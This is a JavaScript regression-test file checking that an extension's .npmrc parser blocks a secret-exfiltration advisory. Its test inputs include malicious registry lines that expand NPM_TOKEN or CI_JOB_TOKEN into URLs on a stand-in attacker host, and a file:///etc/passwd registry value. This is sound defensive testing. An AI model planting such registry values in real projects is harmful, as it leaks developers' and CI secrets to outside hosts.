/**
 * Security regression tests for .npmrc handling.
 *
 * These encode GHSA-3qhv-2rgh-x77r. If one of these fails, the extension has a
 * live secret-exfiltration path — treat it as a release blocker, not a bug.
 */

import { test } from 'node:test';
import assert from 'node:assert/strict';

import {
  parseNpmrc,
  resolveRegistry,
  containsExpansion,
  DEFAULT_REGISTRY,
} from '../out/core/registry/npmrc.js';

test('a value containing ${ is rejected, not expanded', () => {
  const malicious = 'registry=https://attacker.example/${NPM_TOKEN}/';
  const result = parseNpmrc(malicious);
  assert.equal(result.entries.length, 0);
  assert.deepEqual(result.rejectedForExpansion, ['registry']);
});

test('the exfiltration payload never reaches the resolved registry', () => {
  const { registry, rejectedForExpansion } = resolveRegistry({
    projectNpmrc: 'registry=https://attacker.example/${CI_JOB_TOKEN}/',
    allowProjectNpmrc: true,
  });
  assert.equal(registry.url, DEFAULT_REGISTRY);
  assert.equal(registry.source, 'default');
  assert.deepEqual(rejectedForExpansion, ['registry']);
});

test('scoped registry keys get the same expansion check as the top-level key', () => {
  // A top-level pin alone would leave this scoped key pointing at the attacker.
  const { registry, rejectedForExpansion } = resolveRegistry({
    projectNpmrc: [
      'registry=https://registry.npmjs.org',
      '@types:registry=https://attacker.example/${NPM_TOKEN}/',
    ].join('\n'),
    allowProjectNpmrc: true,
  });
  assert.equal(registry.scoped['@types'], undefined);
  assert.deepEqual(rejectedForExpansion, ['@types:registry']);
});

test('a legitimate scoped registry is honored', () => {
  const { registry } = resolveRegistry({
    projectNpmrc: '@myco:registry=https://registry.myco.example',
    allowProjectNpmrc: true,
  });
  assert.equal(registry.scoped['@myco'], 'https://registry.myco.example');
});

test('auth keys are never read', () => {
  const result = parseNpmrc(
    [
      '_authToken=secret-token-value',
      '//registry.npmjs.org/:_authToken=another-secret',
      '_password=hunter2',
      'registry=https://registry.myco.example',
    ].join('\n')
  );
  const keys = result.entries.map((e) => e.key);
  assert.deepEqual(keys, ['registry']);
  const serialized = JSON.stringify(result);
  assert.ok(!serialized.includes('secret-token-value'));
  assert.ok(!serialized.includes('another-secret'));
  assert.ok(!serialized.includes('hunter2'));
});

test('project .npmrc is ignored entirely when not allowed', () => {
  const { registry } = resolveRegistry({
    projectNpmrc: 'registry=https://untrusted.example',
    userNpmrc: 'registry=https://registry.myco.example',
    allowProjectNpmrc: false,
  });
  assert.equal(registry.url, 'https://registry.myco.example');
  assert.equal(registry.source, 'user-npmrc');
});

test('a registry URL with embedded credentials is refused', () => {
  const { registry } = resolveRegistry({
    projectNpmrc: 'registry=https://user:pass@attacker.example',
    allowProjectNpmrc: true,
  });
  assert.equal(registry.url, DEFAULT_REGISTRY);
});

test('non-http protocols are refused', () => {
  const { registry } = resolveRegistry({
    projectNpmrc: 'registry=file:///etc/passwd',
    allowProjectNpmrc: true,
  });
  assert.equal(registry.url, DEFAULT_REGISTRY);
});

test('the source of the effective registry is reported for display', () => {
  const { registry } = resolveRegistry({
    projectNpmrc: 'registry=https://registry.myco.example',
    allowProjectNpmrc: true,
  });
  assert.equal(registry.source, 'project-npmrc');
});

test('containsExpansion is exact about the placeholder syntax', () => {
  assert.equal(containsExpansion('https://ok.example/$NOTAPLACEHOLDER'), false);
  assert.equal(containsExpansion('https://bad.example/${VAR}'), true);
});
